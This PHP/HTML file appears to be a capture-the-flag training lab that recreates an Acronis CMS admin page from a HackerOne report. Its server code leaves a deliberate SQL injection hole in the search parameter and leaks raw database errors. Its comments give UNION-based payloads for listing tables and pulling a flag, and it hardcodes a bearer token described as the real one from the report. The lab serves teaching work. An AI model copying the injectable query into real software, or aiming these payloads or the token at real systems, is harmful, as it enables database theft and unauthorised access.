<?php
// ============================================================
// SQL Injection Lab 117 — UNION-Based SQLi in Admin Search API
// Platform: admin.acronis.host CMS admin panel
// HackerOne Report #923020
// Endpoint: GET /api/admin/pages?page=1&limit=100&sort=+type&filter={}&search={PAYLOAD}
// Header: Authorization: Bearer eyJ0eXAiOiJKV1Qi...
// Vulnerability: `search` GET parameter raw in SQL LIKE clause
//
// Payloads (intercept GET in Burp, modify search=):
//   search=*                                                 → all pages (normal)
//   search='                                                 → SQL error → confirmed
//   search=' UNION SELECT 1,table_name,3,4,5,6 FROM information_schema.tables -- -
//                                                            → table names in data[]
//   search=' UNION SELECT 1,secret_data,3,4,5,6 FROM lab117_secret -- -
//                                                            → flag in title field
// ============================================================

$server   = "localhost";
$username = "root";
$password = "";
$database = "VexiumCTF_DB";

$conn = mysqli_connect($server, $username, $password);
if (!$conn) die(json_encode(["error" => "Connection failed"]));

mysqli_query($conn, "CREATE DATABASE IF NOT EXISTS $database");
mysqli_select_db($conn, $database);

// Hardcoded Bearer token — matches the real token from the report
define('ADMIN_TOKEN', 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9kZXYuYWNyb25pcy5ob3N0XC9hcGlcL2F1dGhcL2xvZ2luIiwiaWF0IjoxNTk0Njk1MzgzLCJleHAiOjE1OTQ3MzEzODMsIm5iZiI6MTU5NDY5NTM4MywianRpIjoiSnBkczlKY0x6VHF5QXphOCIsInN1YiI6MSwicHJ2IjoiODdlMGFmMWVmOWZkMTU4MTJmZGVjOTcxNTNhMTRlMGIwNDc1NDZhYSJ9._K-nn1elXhqx1RNszBeZFwX1dbyCVtv63m_-DGp7UmE');

function initializeLab117Database($conn) {
    mysqli_query($conn, "CREATE TABLE IF NOT EXISTS lab117_pages (
        id         INT AUTO_INCREMENT PRIMARY KEY,
        title      VARCHAR(200) NOT NULL,
        type       VARCHAR(30)  NOT NULL DEFAULT 'page',
        slug       VARCHAR(120) NOT NULL,
        status     VARCHAR(20)  NOT NULL DEFAULT 'published',
        updated_at DATE         NOT NULL
    )");

    mysqli_query($conn, "CREATE TABLE IF NOT EXISTS lab117_secret (
        id          INT AUTO_INCREMENT PRIMARY KEY,
        secret_data VARCHAR(100) NOT NULL
    )");

    $check = mysqli_query($conn, "SELECT * FROM lab117_secret LIMIT 1");
    if (mysqli_num_rows($check) == 0) {
        mysqli_query($conn, "INSERT INTO lab117_secret (secret_data) VALUES ('flag{acronis_admin_sqli_923020}')");
    }

    $checkPages = mysqli_query($conn, "SELECT COUNT(*) AS c FROM lab117_pages");
    $row = mysqli_fetch_assoc($checkPages);
    if ((int)$row['c'] === 0) {
        mysqli_query($conn, "INSERT INTO lab117_pages (title, type, slug, status, updated_at) VALUES
            ('Acronis True Image 2020',       'product',  'true-image-2020',       'published', '2020-06-30'),
            ('Acronis Cyber Backup',          'product',  'cyber-backup',          'published', '2020-07-01'),
            ('Acronis Cyber Protect',         'product',  'cyber-protect',         'published', '2020-06-28'),
            ('Acronis Snap Deploy 5',         'product',  'snap-deploy-5',         'published', '2020-06-25'),
            ('What is Ransomware?',           'article',  'what-is-ransomware',    'published', '2020-06-15'),
            ('Backup Best Practices 2020',    'article',  'backup-best-practices', 'published', '2020-06-20'),
            ('Cloud Backup Guide',            'article',  'cloud-backup-guide',    'draft',     '2020-07-05'),
            ('Partner Program Overview',      'resource', 'partner-program',       'published', '2020-05-10')");
    }
}
initializeLab117Database($conn);

// ============================================================
// JSON API — GET /index.php?api/admin/pages&page=1&limit=100&sort=...&search={PAYLOAD}
// ⚠ `search` injected raw into SQL LIKE clause (no escaping)
// ============================================================
if (array_key_exists('api/admin/pages', $_GET)) {
    header('Content-Type: application/json; charset=utf-8');
    header('Access-Control-Allow-Origin: https://admin.acronis.host');
    header('X-Request-ID: ' . bin2hex(random_bytes(8)));

    // Auth check — Bearer token validation
    // Apache mod_php strips Authorization from $_SERVER; use getallheaders() as fallback
    $allHeaders = function_exists('getallheaders') ? array_change_key_case(getallheaders()) : [];
    $authHeader = $_SERVER['HTTP_AUTHORIZATION']
               ?? $_SERVER['REDIRECT_HTTP_AUTHORIZATION']
               ?? $allHeaders['authorization']
               ?? '';
    $token = trim(str_replace('Bearer', '', $authHeader));
    if ($token !== ADMIN_TOKEN) {
        http_response_code(401);
        echo json_encode(["error" => "Unauthorized", "message" => "Invalid or missing Bearer token"]);
        exit;
    }

    $page  = (int)($_GET['page']  ?? 1);
    $limit = (int)($_GET['limit'] ?? 100);
    $search = $_GET['search'] ?? '*';

    // ====================================================================
    // ⚠ VULNERABLE QUERY — `search` GET parameter interpolated raw into
    //   SQL LIKE clause with no escaping or parameterisation
    //
    // Injection point: ?api/admin/pages&...&search=[HERE]
    //
    // Payload: ' UNION SELECT 1,secret_data,3,4,5,6 FROM lab117_secret -- -
    //   → injects extra row into data[] with flag in the `title` field
    //
    // Payload: ' UNION SELECT 1,table_name,3,4,5,6 FROM information_schema.tables -- -
    //   → reveals all table names as page rows
    // ====================================================================
    if ($search === '*' || $search === '') {
        $sql = "SELECT id, title, type, slug, status, updated_at
                FROM lab117_pages
                ORDER BY type
                LIMIT $limit";
    } else {
        $sql = "SELECT id, title, type, slug, status, updated_at
                FROM lab117_pages
                WHERE title LIKE '%$search%' OR type LIKE '%$search%'
                LIMIT $limit";
    }

    $result = mysqli_query($conn, $sql);
    if ($result === false) {
        http_response_code(500);
        echo json_encode(["error" => "Internal Server Error", "sqlstate" => mysqli_sqlstate($conn), "message" => mysqli_error($conn)]);
        exit;
    }

    $rows = [];
    while ($row = mysqli_fetch_assoc($result)) {
        $rows[] = $row;
    }

    echo json_encode([
        "data"  => $rows,
        "total" => count($rows),
        "page"  => $page,
        "limit" => $limit
    ]);
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Acronis Admin — Pages</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#F0F2F5;color:#1C1C1E;font-size:13px;display:flex;min-height:100vh;}

/* ── Sidebar ─────────────────────────────────────────────────────────────── */
.sidebar{width:210px;background:#0A1F44;display:flex;flex-direction:column;flex-shrink:0;position:fixed;top:0;left:0;height:100vh;overflow-y:auto;}
.sidebar-logo{padding:18px 16px 14px;border-bottom:1px solid rgba(255,255,255,.08);}
.sidebar-logo-text{font-size:1.1rem;font-weight:800;color:#fff;letter-spacing:-.02em;}
.sidebar-logo-sub{font-size:.62rem;color:rgba(255,255,255,.4);margin-top:2px;letter-spacing:.04em;text-transform:uppercase;}
.sidebar-section{padding:10px 0;}
.sidebar-label{font-size:.6rem;font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:rgba(255,255,255,.3);padding:6px 16px 4px;}
.sidebar-item{display:flex;align-items:center;gap:9px;padding:8px 16px;color:rgba(255,255,255,.55);font-size:.78rem;font-weight:500;text-decoration:none;cursor:pointer;transition:all .15s;border-left:3px solid transparent;}
.sidebar-item:hover{background:rgba(255,255,255,.06);color:rgba(255,255,255,.85);}
.sidebar-item.active{background:rgba(59,174,218,.12);color:#3BAEDA;border-left-color:#3BAEDA;font-weight:700;}
.sidebar-item svg{width:15px;height:15px;flex-shrink:0;opacity:.7;}
.sidebar-item.active svg{opacity:1;}
.sidebar-footer{margin-top:auto;padding:12px 16px;border-top:1px solid rgba(255,255,255,.08);}
.sidebar-user{font-size:.7rem;color:rgba(255,255,255,.45);}
.sidebar-user strong{display:block;color:rgba(255,255,255,.7);font-size:.72rem;margin-bottom:1px;}

/* ── Main ────────────────────────────────────────────────────────────────── */
.main{margin-left:210px;flex:1;display:flex;flex-direction:column;min-height:100vh;}
.topbar{background:#fff;border-bottom:1px solid #E5E7EB;height:52px;display:flex;align-items:center;padding:0 24px;gap:12px;position:sticky;top:0;z-index:50;}
.topbar-title{font-size:.95rem;font-weight:700;color:#1C1C1E;}
.topbar-breadcrumb{font-size:.72rem;color:#9CA3AF;}
.topbar-breadcrumb span{color:#3BAEDA;}
.topbar-right{margin-left:auto;display:flex;align-items:center;gap:12px;}
.topbar-env{font-size:.65rem;font-weight:700;background:#FEF3C7;color:#92400E;padding:2px 8px;border-radius:3px;letter-spacing:.03em;}
.btn-new{background:#3BAEDA;color:#fff;font-size:.72rem;font-weight:700;border:none;border-radius:4px;padding:6px 14px;cursor:pointer;font-family:inherit;display:flex;align-items:center;gap:5px;}
.btn-new svg{width:12px;height:12px;}

/* ── Content ─────────────────────────────────────────────────────────────── */
.content{padding:24px;flex:1;}
.card{background:#fff;border:1px solid #E5E7EB;border-radius:8px;overflow:hidden;}
.card-toolbar{padding:12px 16px;border-bottom:1px solid #F3F4F6;display:flex;align-items:center;gap:10px;flex-wrap:wrap;}
.search-wrap{display:flex;align-items:center;gap:0;border:1.5px solid #D1D5DB;border-radius:5px;overflow:hidden;background:#fff;}
.search-wrap:focus-within{border-color:#3BAEDA;box-shadow:0 0 0 3px rgba(59,174,218,.12);}
.search-icon{padding:0 9px;color:#9CA3AF;display:flex;align-items:center;}
.search-icon svg{width:14px;height:14px;}
.search-input{border:none;outline:none;font-size:.78rem;color:#1C1C1E;font-family:inherit;padding:7px 10px 7px 0;width:220px;background:transparent;}
.btn-search{background:#3BAEDA;color:#fff;border:none;padding:0 14px;height:100%;font-size:.75rem;font-weight:700;cursor:pointer;font-family:inherit;white-space:nowrap;}
.toolbar-stats{margin-left:auto;font-size:.7rem;color:#9CA3AF;}

/* ── Table ───────────────────────────────────────────────────────────────── */
.tbl{width:100%;border-collapse:collapse;}
.tbl th{background:#F9FAFB;font-size:.65rem;font-weight:700;letter-spacing:.06em;text-transform:uppercase;color:#6B7280;padding:9px 14px;border-bottom:1px solid #E5E7EB;text-align:left;white-space:nowrap;}
.tbl td{padding:10px 14px;border-bottom:1px solid #F3F4F6;font-size:.78rem;color:#374151;vertical-align:middle;}
.tbl tr:last-child td{border-bottom:none;}
.tbl tr:hover td{background:#F9FAFB;}
.type-badge{display:inline-flex;align-items:center;padding:2px 8px;border-radius:3px;font-size:.65rem;font-weight:700;letter-spacing:.03em;text-transform:uppercase;}
.type-product{background:#EFF6FF;color:#1D4ED8;}
.type-article{background:#F0FDF4;color:#166534;}
.type-resource{background:#FDF4FF;color:#7E22CE;}
.type-other{background:#F3F4F6;color:#4B5563;}
.status-badge{display:inline-flex;align-items:center;gap:4px;font-size:.68rem;font-weight:600;color:#374151;}
.status-badge::before{content:'';width:6px;height:6px;border-radius:50%;flex-shrink:0;}
.status-published::before{background:#10B981;}
.status-draft::before{background:#F59E0B;}
.tbl-id{color:#9CA3AF;font-family:monospace;font-size:.75rem;}
.slug-cell{color:#6B7280;font-family:monospace;font-size:.72rem;}

/* ── Empty / Loading / Error ─────────────────────────────────────────────── */
.tbl-empty{text-align:center;padding:40px 20px;color:#9CA3AF;font-size:.82rem;}
.tbl-error{text-align:left;padding:14px 16px;background:#FEF2F2;color:#991B1B;font-size:.75rem;font-family:monospace;border-radius:6px;margin:12px 16px 16px;white-space:pre-wrap;word-break:break-all;}
.loader{display:inline-block;width:14px;height:14px;border:2px solid #E5E7EB;border-top-color:#3BAEDA;border-radius:50%;animation:spin .7s linear infinite;}
@keyframes spin{to{transform:rotate(360deg)}}

/* ── Footer ──────────────────────────────────────────────────────────────── */
.footer{background:#fff;border-top:1px solid #E5E7EB;padding:12px 24px;font-size:.68rem;color:#9CA3AF;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:6px;}
.footer a{color:#9CA3AF;text-decoration:none;}.footer a:hover{color:#3BAEDA;}
.footer-links{display:flex;gap:14px;}
</style>
</head>
<body>

<!-- Sidebar -->
<nav class="sidebar">
  <div class="sidebar-logo">
    <div class="sidebar-logo-text">&#9670; ACRONIS</div>
    <div class="sidebar-logo-sub">Admin Panel</div>
  </div>

  <div class="sidebar-section">
    <div class="sidebar-label">Content</div>
    <div class="sidebar-item">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg>
      Dashboard
    </div>
    <div class="sidebar-item active">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/></svg>
      Pages
    </div>
    <div class="sidebar-item">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 7l-8-4-8 4m16 0l-8 4m8-4v10l-8 4m0-10L4 7m8 4v10M4 7v10l8 4"/></svg>
      Products
    </div>
    <div class="sidebar-item">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 10l4.553-2.069A1 1 0 0121 8.87v6.26a1 1 0 01-1.447.894L15 14M3 8a2 2 0 012-2h10a2 2 0 012 2v8a2 2 0 01-2 2H5a2 2 0 01-2-2V8z"/></svg>
      Webinars
    </div>
    <div class="sidebar-item">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M7 7h.01M7 3h5c.512 0 1.024.195 1.414.586l7 7a2 2 0 010 2.828l-7 7a2 2 0 01-2.828 0l-7-7A2 2 0 013 12V7a4 4 0 014-4z"/></svg>
      Tags
    </div>
  </div>

  <div class="sidebar-section">
    <div class="sidebar-label">System</div>
    <div class="sidebar-item">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 4.354a4 4 0 110 5.292M15 21H3v-1a6 6 0 0112 0v1zm0 0h6v-1a6 6 0 00-9-5.197M13 7a4 4 0 11-8 0 4 4 0 018 0z"/></svg>
      Users
    </div>
    <div class="sidebar-item">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"/><path d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/></svg>
      Settings
    </div>
  </div>

  <div class="sidebar-footer">
    <div class="sidebar-user">
      <strong>admin@acronis.host</strong>
      Administrator
    </div>
  </div>
</nav>

<!-- Main -->
<div class="main">

  <!-- Top bar -->
  <div class="topbar">
    <div>
      <div class="topbar-title">Pages</div>
      <div class="topbar-breadcrumb">admin.acronis.host &rsaquo; <span>Pages</span></div>
    </div>
    <div class="topbar-right">
      <span class="topbar-env">DEV</span>
      <button class="btn-new">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 5v14M5 12h14"/></svg>
        New Page
      </button>
    </div>
  </div>

  <!-- Content -->
  <div class="content">
    <div class="card">

      <!-- Toolbar -->
      <div class="card-toolbar">
        <div class="search-wrap">
          <span class="search-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/></svg></span>
          <input class="search-input" type="text" id="searchInput" placeholder="Search pages…" value="*" onkeydown="if(event.key==='Enter')doSearch()">
          <button class="btn-search" onclick="doSearch()">Search</button>
        </div>
        <div class="toolbar-stats" id="statsLabel">Loading…</div>
      </div>

      <!-- Table -->
      <div id="tableWrap">
        <div class="tbl-empty"><span class="loader"></span></div>
      </div>

    </div>
  </div>

  <!-- Footer -->
  <footer class="footer">
    <span>dev.acronis.host &nbsp;&middot;&nbsp; Acronis Admin API v1 &nbsp;&middot;&nbsp; GET /api/admin/pages?search={query}</span>
    <div class="footer-links">
      <a href="https://hackerone.com/reports/923020" target="_blank" rel="noopener">HackerOne #923020</a>
      <a href="#">Docs</a>
      <a href="#">Logout</a>
    </div>
  </footer>

</div>

<script>
// Bearer token (from the real Acronis report — intercepted by researcher)
// Students see this in Burp when the search request is made
var BEARER = '<?= ADMIN_TOKEN ?>';

function typeBadge(t) {
  var cls = {product:'type-product', article:'type-article', resource:'type-resource'}[t] || 'type-other';
  return '<span class="type-badge ' + cls + '">' + esc(t) + '</span>';
}
function statusBadge(s) {
  var cls = s === 'published' ? 'status-published' : 'status-draft';
  return '<span class="status-badge ' + cls + '">' + esc(s) + '</span>';
}
function esc(s) {
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

// GET request students intercept in Burp
// Injection point: the `search` query parameter value
function doSearch() {
  var q   = document.getElementById('searchInput').value || '*';
  var url = 'index.php?api/admin/pages'
          + '&page=1'
          + '&limit=100'
          + '&sort=%2Btype'
          + '&filter=%7B%7D'
          + '&search=' + encodeURIComponent(q);

  document.getElementById('statsLabel').innerHTML = '<span class="loader"></span>';
  document.getElementById('tableWrap').innerHTML  = '<div class="tbl-empty"><span class="loader"></span></div>';

  fetch(url, {
    headers: {
      'Authorization': 'Bearer ' + BEARER,
      'Accept':        'application/json, text/plain, */*'
    }
  })
  .then(function(r){ return r.json(); })
  .then(function(json){ renderTable(json); })
  .catch(function(e){
    document.getElementById('tableWrap').innerHTML = '<div class="tbl-error">Network error: ' + esc(String(e)) + '</div>';
    document.getElementById('statsLabel').textContent = '';
  });
}

function renderTable(json) {
  if (json.error) {
    document.getElementById('tableWrap').innerHTML =
      '<div class="tbl-error">Error: ' + esc(json.message || json.error) + '</div>';
    document.getElementById('statsLabel').textContent = '';
    return;
  }

  var rows = json.data || [];
  document.getElementById('statsLabel').textContent = rows.length + ' record' + (rows.length === 1 ? '' : 's') + ' found';

  if (rows.length === 0) {
    document.getElementById('tableWrap').innerHTML = '<div class="tbl-empty">No pages found matching your query.</div>';
    return;
  }

  var html = '<table class="tbl"><thead><tr>'
           + '<th>ID</th><th>Title</th><th>Type</th><th>Slug</th><th>Status</th><th>Updated</th>'
           + '</tr></thead><tbody>';

  rows.forEach(function(r) {
    html += '<tr>'
          + '<td class="tbl-id">' + esc(r.id)         + '</td>'
          + '<td><strong>' + esc(r.title) + '</strong></td>'
          + '<td>' + typeBadge(r.type)                 + '</td>'
          + '<td class="slug-cell">/' + esc(r.slug)    + '</td>'
          + '<td>' + statusBadge(r.status)              + '</td>'
          + '<td>' + esc(r.updated_at)                  + '</td>'
          + '</tr>';
  });

  html += '</tbody></table>';
  document.getElementById('tableWrap').innerHTML = html;
}

// Auto-load on page ready
doSearch();
</script>

</body>
</html>
